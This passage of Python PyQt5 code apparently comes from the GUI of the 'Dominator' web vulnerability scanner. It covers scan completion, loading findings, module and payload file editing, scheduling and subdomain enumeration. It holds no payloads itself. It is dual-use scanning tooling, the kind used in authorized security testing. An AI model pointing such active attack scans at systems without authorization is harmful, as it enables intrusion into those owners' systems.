        elapsed_seconds = int(elapsed)

        # Get max_time from spin box
        max_time_minutes = self.max_time_spin.value() if hasattr(self, 'max_time_spin') else 0

        if max_time_minutes > 0:
            max_seconds = max_time_minutes * 60
            remaining = max(0, max_seconds - elapsed_seconds)
        else:
            remaining = -1

        self.update_time_display(elapsed_seconds, remaining)

    def scan_finished(self, return_code):
        """Handle scan completion"""
        self.start_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        self.pause_btn.setEnabled(False)
        self.pause_btn.setText("Pause")

        # Stop time update timer
        self.time_update_timer.stop()

        # MEMORY LEAK FIX: Disconnect scan thread signals to prevent accumulation
        self._disconnect_scan_signals()

        # Update progress tab builder
        if hasattr(self, 'progress_tab_builder'):
            self.progress_tab_builder.enable_controls(False)

        if return_code == 0:
            self.statusBar().showMessage("Scan completed successfully")
            self.output_console.append("\n[+] Scan completed successfully!")
            self.progress_bar.setValue(100)
            self.current_module_label.setText("Scan complete!")

            # Load full findings from JSON report to show all details
            self._load_findings_from_report()

            # Update progress tab builder
            if hasattr(self, 'progress_tab_builder'):
                self.progress_tab_builder.add_activity_log("Scan completed successfully!", "success")
                self.progress_tab_builder.update_dashboard_stats(
                    current_module="Scan complete!",
                    vulns=sum(self.vuln_counts.values()) if hasattr(self, 'vuln_counts') else 0
                )

            # Auto-save project if not temporary
            if not self.project_manager.is_temp:
                self.save_project_settings()
                # Add scan to history
                scan_info = {
                    'target': self.target_input.toPlainText(),
                    'modules': [name for name, cb in self.module_checkboxes.items() if cb.isChecked()],
                    'vulnerabilities_found': sum(self.vuln_counts.values())
                }
                self.project_manager.add_scan_to_history(scan_info)
                self.output_console.append(f"[+] Project auto-saved to: {self.project_manager.project_path}")

            # Switch to results tab
            self.tabs.setCurrentIndex(self.TAB_RESULTS)

            # Send notifications
            self._send_scan_notifications("Scan Completed", True)
        else:
            self.statusBar().showMessage("Scan failed or was stopped")
            self.output_console.append("\n[!] Scan failed or was stopped")

            # Update progress tab builder
            if hasattr(self, 'progress_tab_builder'):
                self.progress_tab_builder.add_activity_log("Scan failed or was stopped", "error")

            # Send notifications for stopped/failed scan
            self._send_scan_notifications("Scan Stopped", False)

    def _load_findings_from_report(self):
        """Load full findings data from JSON report after scan completion"""
        import json
        from pathlib import Path
        from GUI.ui_tabs.results_tab import add_finding_to_table
        from GUI.utils.loading_dialog import LoadingDialog

        try:
            parent_dir = Path(__file__).parent.parent

            # Look for latest JSON report
            json_reports = list(parent_dir.glob("scan_report_*.json"))
            if not json_reports:
                self.output_console.append("[*] No JSON report found - showing live results only")
                return

            # Get latest report
            latest_report = max(json_reports, key=lambda p: p.stat().st_mtime)
            self.output_console.append(f"[+] Loading full findings from: {latest_report.name}")

            # Load JSON report
            with open(latest_report, 'r', encoding='utf-8') as f:
                report_data = json.load(f)

            # JSON report uses 'results' key (not 'findings')
            findings = report_data.get('results', [])
            if not findings:
                self.output_console.append("[*] No findings in JSON report")
                return

            self.output_console.append(f"[+] Found {len(findings)} results in report")

            # Clear existing findings and reload with full data
            self.results_table.setRowCount(0)

            # Reset vuln counts (include INFO)
            self.vuln_counts = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0, 'INFO': 0}

            # Show loading dialog for large reports (>50 findings)
            loading_dialog = None
            if len(findings) > 50:
                loading_dialog = LoadingDialog(self, f"Loading {len(findings)} findings...")
                loading_dialog.set_determinate(len(findings))
                loading_dialog.show()
                QApplication.processEvents()

            loaded_count = 0
            # Add each finding with full data
            for i, finding in enumerate(findings):
                # Only include findings marked as vulnerability, info, or recon
                is_vuln = finding.get('vulnerability', False)
                is_info = finding.get('info', False)
                is_recon = finding.get('type') == 'recon' or finding.get('severity', '').lower() == 'info'

                if not is_vuln and not is_info and not is_recon:
                    continue

                # Normalize severity to uppercase
                severity = finding.get('severity', 'MEDIUM').upper()
                if severity not in self.vuln_counts:
                    severity = 'MEDIUM'  # Default fallback

                title = finding.get('type', finding.get('description', 'Unknown'))
                module = finding.get('module', '')
                target = finding.get('url', '')

                # Full finding data for detail panel - include ALL available fields
                finding_data = {
                    'parameter': finding.get('parameter', ''),
                    'payload': finding.get('payload', ''),
                    'evidence': finding.get('evidence', ''),
                    'cvss': finding.get('cvss', finding.get('cvss_score', '')),
                    'cvss_vector': finding.get('cvss_vector', ''),
                    'cwe': finding.get('cwe', finding.get('cwe_id', '')),
                    'cwe_name': finding.get('cwe_name', ''),
                    'owasp': finding.get('owasp', finding.get('owasp_category', '')),
                    'owasp_name': finding.get('owasp_name', ''),
                    'description': finding.get('description', title),  # Use title as fallback
                    'remediation': finding.get('remediation', finding.get('fix', '')),
                    'request': finding.get('request', ''),
                    'response': finding.get('response', ''),
                    'method': finding.get('method', 'GET'),
                    'confidence': finding.get('confidence', 0.8),
                    'timestamp': finding.get('timestamp', ''),
                }

                # Add to table with full data
                add_finding_to_table(self, severity, title, module, target, finding_data)

                # Update counts
                self.vuln_counts[severity] += 1
                loaded_count += 1

                # Update loading dialog progress every 10 findings
                if loading_dialog and i % 10 == 0:
                    loading_dialog.update_progress(i + 1, f"Loading finding {i + 1} of {len(findings)}...")

            # Close loading dialog
            if loading_dialog:
                loading_dialog.close()

            self.output_console.append(f"[+] Loaded {loaded_count} findings with full details")

            # Update all displays
            self.results_handler.update_vuln_display()

            # Update stats cards if available
            if hasattr(self, 'total_card'):
                self.total_card.set_value(loaded_count)
            if hasattr(self, 'critical_card'):
                self.critical_card.set_value(self.vuln_counts['CRITICAL'])
            if hasattr(self, 'high_card'):
                self.high_card.set_value(self.vuln_counts['HIGH'])
            if hasattr(self, 'medium_card'):
                self.medium_card.set_value(self.vuln_counts['MEDIUM'])
            if hasattr(self, 'low_card'):
                self.low_card.set_value(self.vuln_counts['LOW'])

            # Update pie chart
            if hasattr(self, 'pie_chart'):
                self.pie_chart.set_data(self.vuln_counts)

        except Exception as e:
            import traceback
            self.output_console.append(f"[!] Error loading findings from report: {e}")
            self.output_console.append(f"[!] Traceback: {traceback.format_exc()}")

    def _send_scan_notifications(self, title, success):
        """Send notifications about scan completion"""
        try:
            from GUI.utils.notification_manager import get_notification_manager

            manager = get_notification_manager()

            # Check if any notifications are enabled
            if not any([
                manager.settings.get('telegram_enabled'),
                manager.settings.get('email_enabled'),
                manager.settings.get('slack_enabled')
            ]):
                return

            # Build message
            target = self.target_input.toPlainText().split('\n')[0][:50]
            if len(self.target_input.toPlainText()) > 50:
                target += "..."

            if success:
                message = f"Scan completed for: {target}"
            else:
                message = f"Scan was stopped for: {target}"

            # Build summary
            results_summary = {
                'critical': self.vuln_counts.get('CRITICAL', 0),
                'high': self.vuln_counts.get('HIGH', 0),
                'medium': self.vuln_counts.get('MEDIUM', 0),
                'low': self.vuln_counts.get('LOW', 0),
                'total': sum(self.vuln_counts.values())
            }

            # Send notifications
            results = manager.send_notification(title, message, results_summary)

            # Log results
            for provider, sent, msg in results:
                if sent:
                    self.output_console.append(f"[+] {provider} notification sent")
                else:
                    self.output_console.append(f"[!] {provider} notification failed: {msg}")

        except Exception as e:
            self.output_console.append(f"[!] Failed to send notifications: {e}")

    # Menu action handlers
    def new_scan(self):
        """Reset GUI for a new scan"""
        self.target_input.clear()
        self.target_file_input.clear()
        self.output_console.clear()
        self.vulns_list.clear()
        self.vuln_counts = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0}
        self.results_handler.update_vuln_display()
        self.progress_bar.setValue(0)
        self.current_module_label.setText("")
        self.tabs.setCurrentIndex(self.TAB_SCAN_CONFIG)

        # Reset project file and window title
        self.current_project_file = None
        self.setWindowTitle("Dominator Web Vulnerability Scanner")

        # Clear HTTP config
        self.headers_input.clear()
        self.cookies_input.clear()

        # Clear custom payloads
        self.custom_payloads_text.clear()

        self.statusBar().showMessage("Ready for new project")

    def clear_targets(self):
        """Clear target input"""
        self.target_input.clear()
        self.target_file_input.clear()
        self.statusBar().showMessage("Targets cleared")

    def load_modules_list(self):
        """Load and display all modules in the list"""
        import json

        self.module_list.clear()
        parent_dir = Path(__file__).parent.parent
        modules_dir = parent_dir / "modules"

        if not modules_dir.exists():
            return

        module_data = []

        # Scan modules directory
        for module_path in modules_dir.iterdir():
            if module_path.is_dir() and not module_path.name.startswith('_'):
                config_file = module_path / "config.json"

                # Load module metadata
                module_name = "Unknown Module"
                module_desc = "No description available"
                severity = "Info"

                if config_file.exists():
                    try:
                        with open(config_file, 'r', encoding='utf-8') as f:
                            config = json.load(f)
                            module_name = config.get('name', module_path.name)
                            module_desc = config.get('description', 'No description')
                            severity = config.get('severity', 'Info')
                    except (json.JSONDecodeError, IOError, UnicodeDecodeError):
                        # Fall back to folder name if config is malformed
                        module_name = module_path.name
                else:
                    module_name = module_path.name

                module_data.append({
                    'folder': module_path.name,
                    'name': module_name,
                    'description': module_desc,
                    'severity': severity
                })

        # Sort by folder name
        module_data.sort(key=lambda x: x['folder'])

        # Add to list
        for module in module_data:
            # Create enhanced display with severity badge
            severity_markers = {
                'Critical': '[!!!]',
                'High': '[!!]',
                'Medium': '[!]',
                'Low': '[i]',
                'Info': '[i]'
            }
            severity_marker = severity_markers.get(module['severity'], '[?]')

            # Format: Name on first line, description on second, severity/status on third
            desc_preview = module['description'][:50] + '...' if len(module['description']) > 50 else module['description']

            # Check if enabled
            parent_dir_check = Path(__file__).parent.parent
            config_file_check = parent_dir_check / "modules" / module['folder'] / "config.json"
            enabled = True
            if config_file_check.exists():
                try:
                    with open(config_file_check, 'r', encoding='utf-8') as f:
                        config_check = json.load(f)
                        enabled = config_check.get('enabled', True)
                except (json.JSONDecodeError, IOError, UnicodeDecodeError):
                    # Default to enabled if config is unreadable
                    enabled = True

            status_icon = "ON" if enabled else "OFF"
            item_text = f"{module['name']}\n{desc_preview}\n{severity_marker} {module['severity']} | {status_icon}"

            item = QListWidgetItem(item_text)
            item.setData(Qt.UserRole, module['folder'])  # Store folder name

            # Set bigger size hint for better readability
            item.setSizeHint(QSize(280, 75))

            self.module_list.addItem(item)

        self.module_count_label.setText(f"Modules: {len(module_data)}")

        # Select first item if available
        if module_data:
            self.module_list.setCurrentRow(0)
            self.on_module_selected(self.module_list.item(0))

    def filter_modules(self):
        """Filter modules list based on search text"""
        search_text = self.module_search.text().lower()

        visible_count = 0
        for i in range(self.module_list.count()):
            item = self.module_list.item(i)
            item_text = item.text().lower()

            # Check if search text is in item text
            if search_text in item_text:
                item.setHidden(False)
                visible_count += 1
            else:
                item.setHidden(True)

        self.module_count_label.setText(f"Modules: {visible_count}/{self.module_list.count()}")

    def on_module_selected(self, item):
        """Handle module selection from list"""
        if not item:
            return

        module_folder = item.data(Qt.UserRole)
        self.load_module_data(module_folder)

        # Update the info panel if it exists
        from GUI.ui_tabs.modules_tab import update_module_info_panel
        if hasattr(self, 'module_info_name'):
            update_module_info_panel(self, module_folder)

    def load_module_data(self, module_name):
        """Load module configuration and payloads"""
        if not module_name:
            return

        parent_dir = Path(__file__).parent.parent
        module_dir = parent_dir / "modules" / module_name

        # Load config.json
        config_file = module_dir / "config.json"
        if config_file.exists():
            try:
                with open(config_file, 'r', encoding='utf-8') as f:
                    config_content = f.read()
                # Pretty print JSON
                import json
                config_data = json.loads(config_content)
                formatted_config = json.dumps(config_data, indent=2)
                self.module_config_editor.setPlainText(formatted_config)
            except Exception as e:
                self.module_config_editor.setPlainText(f"Error loading config: {e}")
        else:
            self.module_config_editor.setPlainText("No config.json found for this module")

        # Load payloads.txt
        payloads_file = module_dir / "payloads.txt"
        if payloads_file.exists():
            try:
                with open(payloads_file, 'r', encoding='utf-8') as f:
                    payloads_content = f.read()
                self.module_payloads_editor.setPlainText(payloads_content)
            except Exception as e:
                self.module_payloads_editor.setPlainText(f"Error loading payloads: {e}")
        else:
            self.module_payloads_editor.setPlainText("No payloads.txt found for this module")

        self.update_payload_stats()

    def save_module_config(self):
        """Save module configuration"""
        current_item = self.module_list.currentItem()
        if not current_item:
            show_warning(self, "No Module", "Please select a module first")
            return

        module_name = current_item.data(Qt.UserRole)
        parent_dir = Path(__file__).parent.parent
        config_file = parent_dir / "modules" / module_name / "config.json"

        try:
            # Validate JSON first
            import json
            config_text = self.module_config_editor.toPlainText()
            json.loads(config_text)  # This will raise if invalid

            # Save
            with open(config_file, 'w', encoding='utf-8') as f:
                f.write(config_text)

            QMessageBox.information(self, "Success", f"Config saved for {module_name}")
        except json.JSONDecodeError as e:
            QMessageBox.critical(self, "Invalid JSON", f"JSON syntax error:\n{e}")
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to save config:\n{e}")

    def save_module_payloads(self):
        """Save module payloads"""
        current_item = self.module_list.currentItem()
        if not current_item:
            QMessageBox.warning(self, "No Module", "Please select a module first")
            return

        module_name = current_item.data(Qt.UserRole)
        parent_dir = Path(__file__).parent.parent
        payloads_file = parent_dir / "modules" / module_name / "payloads.txt"

        try:
            with open(payloads_file, 'w', encoding='utf-8') as f:
                f.write(self.module_payloads_editor.toPlainText())

            QMessageBox.information(self, "Success", f"Payloads saved for {module_name}")
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to save payloads:\n{e}")

    def export_module_payloads(self):
        """Export module payloads to external file"""
        current_item = self.module_list.currentItem()
        if not current_item:
            return

        module_name = current_item.data(Qt.UserRole)
        filename, _ = QFileDialog.getSaveFileName(
            self, "Export Payloads", f"{module_name}_payloads.txt", "Text Files (*.txt);;All Files (*)"
        )
        if filename:
            try:
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(self.module_payloads_editor.toPlainText())
                QMessageBox.information(self, "Success", f"Payloads exported to:\n{filename}")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to export:\n{e}")

    def reload_current_module(self):
        """Reload the currently selected module's data"""
        current_item = self.module_list.currentItem()
        if current_item:
            module_name = current_item.data(Qt.UserRole)
            self.load_module_data(module_name)

    def update_payload_stats(self):
        """Update payload statistics"""
        text = self.module_payloads_editor.toPlainText()
        lines = text.split('\n')
        total_lines = len(lines)
        payloads = [line.strip() for line in lines if line.strip() and not line.strip().startswith('#')]
        payload_count = len(payloads)

        self.payload_stats_label.setText(f"Payloads: {payload_count} | Total Lines: {total_lines}")

    def show_options_dialog(self):
        """Show the options dialog"""
        dialog = OptionsDialog(self)
        if dialog.exec_() == dialog.Accepted:
            # Apply any immediate settings changes
            # Theme change
            theme = dialog.settings.get("theme", "Light")
            if theme == "Light":
                self.theme_manager.apply_theme("light")
            elif theme == "Dark":
                self.theme_manager.apply_theme("hacker_green")

            self.statusBar().showMessage("Settings saved", 3000)

    def show_scheduler(self):
        """Show the scheduler dialog"""
        if not hasattr(self, 'scheduler_manager') or self.scheduler_manager is None:
            self.scheduler_manager = SchedulerManager(self)
            self.scheduler_manager.scheduler_updated.connect(self.update_scheduler_status)

        self.scheduler_manager.show()
        self.scheduler_manager.raise_()
        self.scheduler_manager.activateWindow()

    def update_scheduler_status(self):
        """Update status bar with scheduler info"""
        if hasattr(self, 'scheduler_manager') and self.scheduler_manager:
            status = self.scheduler_manager.get_scheduler_status()
            if status:
                self.statusBar().showMessage(status)

    def check_scheduled_scans_on_startup(self):
        """Check for due scheduled scans on startup"""
        due_tasks = check_due_scans()
        if due_tasks:
            msg = f"The following scheduled scans are due:\n\n"
            msg += "\n".join(f"- {task}" for task in due_tasks[:5])
            if len(due_tasks) > 5:
                msg += f"\n... and {len(due_tasks) - 5} more"
            msg += "\n\nOpen Scheduler to run them?"

            reply = QMessageBox.question(
                self, "Scheduled Scans Due",
                msg,
                QMessageBox.Yes | QMessageBox.No
            )
            if reply == QMessageBox.Yes:
                self.show_scheduler()

    def start_scheduler_background(self):
        """Start the background scheduler thread"""
        if not hasattr(self, 'scheduler_manager') or self.scheduler_manager is None:
            self.scheduler_manager = SchedulerManager(self)
            self.scheduler_manager.scheduler_updated.connect(self.update_scheduler_status)

        # Update status bar periodically
        self.scheduler_status_timer = QTimer()
        self.scheduler_status_timer.timeout.connect(self.update_scheduler_status)
        self.scheduler_status_timer.start(60000)  # Update every minute

    # ========== Subdomain Scan Menu Handlers ==========

    def run_subdomain_enumeration(self):
        """Run subdomain enumeration for the target"""
        target = self.target_input.toPlainText().strip()
        if not target:
            QMessageBox.warning(self, "No Target", "Please enter a target URL first.")
            return

        # Extract domain from URL
        from urllib.parse import urlparse
        try:
            parsed = urlparse(target if target.startswith('http') else f'https://{target}')
            domain = parsed.netloc or parsed.path.split('/')[0]
            domain = domain.replace('www.', '')
        except:
            domain = target

        # Confirm
        reply = QMessageBox.question(
            self, "Enumerate Subdomains",
            f"This will enumerate subdomains for: {domain}\n\n"
            "The enumeration will use passive techniques (crt.sh, DNS records).\n\n"
            "Continue?",
            QMessageBox.Yes | QMessageBox.No
        )

        if reply == QMessageBox.Yes:
            # Set the enum_subdomains checkbox and start scan
            if hasattr(self, 'enum_subdomains_cb'):
                self.enum_subdomains_cb.setChecked(True)
            if hasattr(self, 'scan_subdomains_cb'):
                self.scan_subdomains_cb.setChecked(False)
            self.output_console.append(f"[*] Starting subdomain enumeration for: {domain}")
            self.start_scan()

    def run_subdomain_scan(self):
        """Enumerate subdomains and then scan them"""
        target = self.target_input.toPlainText().strip()
        if not target:
            QMessageBox.warning(self, "No Target", "Please enter a target URL first.")
            return

        # Extract domain
        from urllib.parse import urlparse
        try:
            parsed = urlparse(target if target.startswith('http') else f'https://{target}')
            domain = parsed.netloc or parsed.path.split('/')[0]
            domain = domain.replace('www.', '')
        except:
            domain = target

        reply = QMessageBox.question(
            self, "Scan Subdomains",
            f"This will:\n"
            f"1. Enumerate subdomains for: {domain}\n"
            f"2. Scan all discovered subdomains\n\n"
            "This may take a while. Continue?",
            QMessageBox.Yes | QMessageBox.No
        )

        if reply == QMessageBox.Yes:
            # Enable both enumeration and scanning
            if hasattr(self, 'enum_subdomains_cb'):
                self.enum_subdomains_cb.setChecked(True)
            if hasattr(self, 'scan_subdomains_cb'):
                self.scan_subdomains_cb.setChecked(True)
            self.output_console.append(f"[*] Starting subdomain enumeration + scan for: {domain}")
            self.start_scan()

    def run_subdomain_takeover_check(self):
        """Check for subdomain takeover vulnerabilities"""
        target = self.target_input.toPlainText().strip()
        if not target:
            QMessageBox.warning(self, "No Target", "Please enter a target URL first.")
            return

        reply = QMessageBox.question(
            self, "Subdomain Takeover Check",
            "This will check for subdomain takeover vulnerabilities.\n\n"
            "The scan will look for:\n"
            "- Dangling DNS records (CNAME pointing to unregistered services)\n"
            "- Expired cloud resources (S3, Azure, etc.)\n"
            "- Unclaimed service endpoints\n\n"
            "Continue?",
            QMessageBox.Yes | QMessageBox.No
        )

        if reply == QMessageBox.Yes:
            if hasattr(self, 'enum_subdomains_cb'):
                self.enum_subdomains_cb.setChecked(True)
            if hasattr(self, 'subdomain_takeover_cb'):
                self.subdomain_takeover_cb.setChecked(True)
            self.output_console.append("[*] Starting subdomain takeover check...")
            self.start_scan()

    def run_quick_scan(self):
        """Run a fast scan with minimal payloads"""
        target = self.target_input.toPlainText().strip()
        if not target:
            QMessageBox.warning(self, "No Target", "Please enter a target URL first.")
            return

        reply = QMessageBox.question(
            self, "Quick Scan",
            "Quick Scan mode will:\n"
            "- Use reduced payload sets\n"
            "- Skip time-consuming tests\n"
            "- Focus on high-confidence vulnerabilities\n\n"
            "This is faster but may miss some vulnerabilities.\n\n"
            "Continue?",
            QMessageBox.Yes | QMessageBox.No
        )

        if reply == QMessageBox.Yes:
            if hasattr(self, 'fast_mode_cb'):
                self.fast_mode_cb.setChecked(True)
            if hasattr(self, 'payload_limit_spin'):
                self.payload_limit_spin.setValue(5)  # Minimal payloads
            self.output_console.append("[*] Starting quick scan (fast mode)...")
            self.start_scan()

    def run_profile_only_scan(self):
        """Profile the target without sending attack payloads"""
        target = self.target_input.toPlainText().strip()
        if not target:
            QMessageBox.warning(self, "No Target", "Please enter a target URL first.")
            return

        reply = QMessageBox.question(
            self, "Profile Only",
            "Profile Only mode will:\n"
            "- Crawl the target\n"
            "- Identify technologies\n"
            "- Discover endpoints and parameters\n"
            "- NOT send any attack payloads\n\n"
            "This is safe for initial reconnaissance.\n\n"
            "Continue?",
            QMessageBox.Yes | QMessageBox.No
        )

        if reply == QMessageBox.Yes:
            if hasattr(self, 'profile_only_cb'):
                self.profile_only_cb.setChecked(True)
            self.output_console.append("[*] Starting profile-only scan (no attacks)...")
            self.start_scan()

    # ========== End Subdomain Scan Menu Handlers ==========

    def view_debug_log(self):
        """Open the debug log file"""
        log_file = Path(__file__).parent.parent / "gui_debug.log"
        if log_file.exists():
            import platform
            import subprocess
            if platform.system() == 'Windows':
                os.startfile(str(log_file))
            elif platform.system() == 'Darwin':
                subprocess.call(['open', str(log_file)])
            else:
                subprocess.call(['xdg-open', str(log_file)])
        else:
            QMessageBox.information(self, "Debug Log", "No debug log file exists yet.\nIt will be created when an error occurs.")

    def clear_debug_log(self):
        """Clear the debug log file"""
        log_file = Path(__file__).parent.parent / "gui_debug.log"
        try:
            if log_file.exists():
                log_file.unlink()
            QMessageBox.information(self, "Debug Log", "Debug log cleared successfully.")
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Failed to clear debug log: {e}")

    def toggle_debug_mode(self, checked):
        """Toggle debug mode"""
        self.debug_mode = checked
        if checked:
            self.output_console.append("[DEBUG] Debug mode enabled - verbose output active")
            # Write to log
            log_file = Path(__file__).parent.parent / "gui_debug.log"
            from datetime import datetime
            with open(log_file, 'a', encoding='utf-8') as f:
                f.write(f"\n[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Debug mode enabled\n")
        else:
            self.output_console.append("[DEBUG] Debug mode disabled")

    def show_about(self):
        """Show about dialog"""
        about_text = """
        <h2>🎯 DOMINATOR Web Vulnerability Scanner</h2>
        <p><b>Version:</b> 1.5.0 (GUI v1.5.0)</p>
        <p><b>Description:</b> Advanced Web Vulnerability Scanner with 20 modules</p>

        <h3>Features:</h3>
        <ul>
            <li>20 vulnerability detection modules</li>
            <li>Real-time scan progress tracking</li>
            <li>Custom payloads support</li>
            <li>Multiple target formats (URL, IP, CIDR, ranges)</li>
            <li>Passive detection & active scanning</li>
            <li>Out-of-Band (OOB) detection</li>
        </ul>

        <h3>Modules:</h3>
        <p>SQL Injection, XSS, CSRF, LFI, RFI, XXE, CMDi, SSTI, XPath, IDOR,
        SSRF, Open Redirect, DOM XSS, File Upload, Weak Credentials,
        Directory Brute Force, Git Exposure, Environment Secrets, PHP Object Injection</p>

        <p><b>GitHub:</b> <a href="https://github.com/vulnz/dominator">https://github.com/vulnz/dominator</a></p>
        <p><b>License:</b> MIT</p>
        """
        QMessageBox.about(self, "About Dominator", about_text)

    def populate_scan_plan(self, command):
        """Populate the scan plan table based on command arguments"""
        # Extract modules from command
        modules = []
        if "--all" in command:
            # Get ALL modules dynamically from modules directory
            modules = self._get_all_module_names()
        elif "-m" in command:
            # Specific modules
            m_index = command.index("-m")
            if m_index + 1 < len(command):
                module_str = command[m_index + 1]
                modules = [m.strip().replace('_', ' ').title() for m in module_str.split(',')]

        # Update the new progress tab builder if available
        if hasattr(self, 'progress_tab_builder'):
            self.progress_tab_builder.populate_module_grid(modules)
            self.progress_tab_builder.reset_dashboard()
            self.progress_tab_builder.enable_controls(True)
            self.progress_tab_builder.add_activity_log(f"Scan started with {len(modules)} modules", "info")

    def _get_all_module_names(self):
        """Get all available module names from the modules directory"""
        modules = []
        modules_dir = Path(__file__).parent.parent / "modules"

        if not modules_dir.exists():
            return modules

        for module_path in sorted(modules_dir.iterdir()):
            if not module_path.is_dir() or module_path.name.startswith('_'):
                continue

            # Skip utility modules
            if module_path.name in ['oob_detection', '__pycache__']:
                continue

            # Get module name from config or derive from folder name
            config_file = module_path / "config.json"
            toml_file = module_path / "config.toml"
            name = module_path.name.replace('_', ' ').title()

            # Try to load config for actual name
            if toml_file.exists():
                try:
                    import tomllib
                    with open(toml_file, 'rb') as f:
                        config = tomllib.load(f)
                        if config.get('enabled', True):
                            name = config.get('name', name)
                            modules.append(name)
                        continue
                except:
                    pass

            if config_file.exists():
                try:
                    import json
                    with open(config_file, 'r', encoding='utf-8') as f:
                        config = json.load(f)
                        if config.get('enabled', True):
                            name = config.get('name', name)
                            modules.append(name)
                        continue
                except:
                    pass

            # Default - add module if has module.py
            if (module_path / "module.py").exists():
                modules.append(name)

        return modules

    def _update_time_display_legacy(self):
        """Update elapsed time and estimates (legacy method for old Progress tab)"""
        if not self.scan_start_time:
            return

        import datetime
        now = datetime.datetime.now()
        elapsed = now - self.scan_start_time

        # Format elapsed time as HH:MM:SS
        hours = int(elapsed.total_seconds() // 3600)
        minutes = int((elapsed.total_seconds() % 3600) // 60)
        seconds = int(elapsed.total_seconds() % 60)
        self.elapsed_time_label.setText(f"{hours:02d}:{minutes:02d}:{seconds:02d}")

        # Calculate estimated remaining time based on progress
        if hasattr(self, 'progress_bar') and self.progress_bar.value() > 0:
            progress_pct = self.progress_bar.value() / 100.0
            if progress_pct > 0:
                estimated_total = elapsed.total_seconds() / progress_pct
                remaining = estimated_total - elapsed.total_seconds()

                if remaining > 0:
                    rem_hours = int(remaining // 3600)
                    rem_minutes = int((remaining % 3600) // 60)
                    rem_seconds = int(remaining % 60)
                    self.estimated_time_label.setText(f"{rem_hours:02d}:{rem_minutes:02d}:{rem_seconds:02d}")

                    # Calculate completion time
                    completion_time = now + datetime.timedelta(seconds=remaining)
                    self.completion_time_label.setText(completion_time.strftime("%Y-%m-%d %H:%M:%S"))
                else:
                    self.estimated_time_label.setText("00:00:00")
                    self.completion_time_label.setText("Now")
            else:
                self.estimated_time_label.setText("Calculating...")
                self.completion_time_label.setText("Calculating...")
        else:
            self.estimated_time_label.setText("Calculating...")
            self.completion_time_label.setText("Calculating...")

    def update_plan_status(self, module_name, status, progress=None):
        """Update module status in plan table"""
        # Update the new progress tab builder if available
        if hasattr(self, 'progress_tab_builder'):
            self.progress_tab_builder.update_module_status(module_name, status, progress)

            # Log status changes
            if status == "Complete":
                self.progress_tab_builder.add_activity_log(f"Completed: {module_name}", "success")
            elif status == "Failed":
                self.progress_tab_builder.add_activity_log(f"Failed: {module_name}", "error")

    def on_scan_page_requested(self, url, config):
        """Handle scan page request from browser tab with auto-configured cookies and headers"""
        # Set the target URL
        self.target_input.setText(url)

        # Get modules from config (could be list or dict)
        if isinstance(config, dict):
            modules = config.get('modules', [])
            cookies = config.get('cookies', {})
            custom_headers = config.get('custom_headers', {})
        else:
            # Backward compatibility - config is a list of modules
            modules = config if config else []
            cookies = {}
            custom_headers = {}

        # Clear current module selection
        for i in range(self.module_list.count()):
            item = self.module_list.item(i)
            item.setCheckState(Qt.Unchecked)

        # Select requested modules
        if modules:  # If specific modules requested
            for i in range(self.module_list.count()):
                item = self.module_list.item(i)
                module_folder = item.data(Qt.UserRole)
                if module_folder in modules:
                    item.setCheckState(Qt.Checked)
        else:  # If all modules requested
            for i in range(self.module_list.count()):
                item = self.module_list.item(i)
                item.setCheckState(Qt.Checked)

        # Auto-configure cookies if provided
        if cookies:
            cookie_str = "; ".join([f"{k}={v}" for k, v in cookies.items()])
            self.cookies_input.setText(cookie_str)

        # Auto-configure custom headers if provided
        if custom_headers:
            headers_str = "\n".join([f"{k}: {v}" for k, v in custom_headers.items()])
            self.headers_input.setPlainText(headers_str)

        # IMPORTANT: Enable single-page mode to scan ONLY the selected URL
        # This prevents the scanner from crawling the entire site
        self.single_page_cb.setChecked(True)
        self.max_crawl_spin.setValue(1)  # Set max crawl pages to 1

        # Switch to Scan Configuration tab
        self.tabs.setCurrentIndex(self.TAB_SCAN_CONFIG)

        # Show message
        module_text = "all modules" if not modules else ", ".join(modules)
        self.output_console.append(f"\n🔍 Browser → Scanner: Configured scan for {url}")
        self.output_console.append(f"   Mode: SINGLE PAGE (no crawling) ✓")
        self.output_console.append(f"   Modules: {module_text}")
        if cookies:
            self.output_console.append(f"   Cookies: {len(cookies)} auto-configured ✓")
        if custom_headers:
            self.output_console.append(f"   Headers: {len(custom_headers)} auto-configured ✓")
        self.output_console.append(f"   Click 'Start Scan' to begin\n")

        # Optionally auto-start the scan
        # self.start_scan()


def handle_exception(exc_type, exc_value, exc_tb):
    """Global exception handler to catch uncaught exceptions"""
    import traceback
    from datetime import datetime
    from PyQt5.QtWidgets import QMessageBox

    # Don't catch keyboard interrupt
    if issubclass(exc_type, KeyboardInterrupt):
        sys.__excepthook__(exc_type, exc_value, exc_tb)
        return

    # Log the error
    error_msg = ''.join(traceback.format_exception(exc_type, exc_value, exc_tb))
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Print to console
    print(f"\n{'='*60}")
    print(f"[CRITICAL ERROR] {timestamp}")
    print(f"{'='*60}")
    print(error_msg)
    print(f"{'='*60}\n")

    # Write to debug log file
    try:
        log_file = Path(__file__).parent.parent / "gui_debug.log"
        with open(log_file, 'a', encoding='utf-8') as f:
            f.write(f"\n{'='*60}\n")
            f.write(f"[ERROR] {timestamp}\n")
            f.write(f"{'='*60}\n")
            f.write(error_msg)
            f.write(f"{'='*60}\n")
        print(f"[DEBUG] Error logged to: {log_file}")
    except Exception as log_err:
        print(f"[DEBUG] Failed to write log file: {log_err}")

    # Try to show a message box with more details
    try:
        msg = QMessageBox()
        msg.setIcon(QMessageBox.Critical)
        msg.setWindowTitle("Dominator - Critical Error")
        msg.setText(f"An unexpected error occurred:\n\n{exc_type.__name__}: {exc_value}")
        msg.setInformativeText("Check gui_debug.log for full details.\nClick 'Show Details' for traceback.")
        msg.setDetailedText(error_msg)
        msg.setStandardButtons(QMessageBox.Ok)
        msg.exec_()
    except Exception:
        # If we can't show a dialog, just print
        pass


def main():
    """Main function to run the GUI"""
    # Install global exception handler
    sys.excepthook = handle_exception

    app = QApplication(sys.argv)
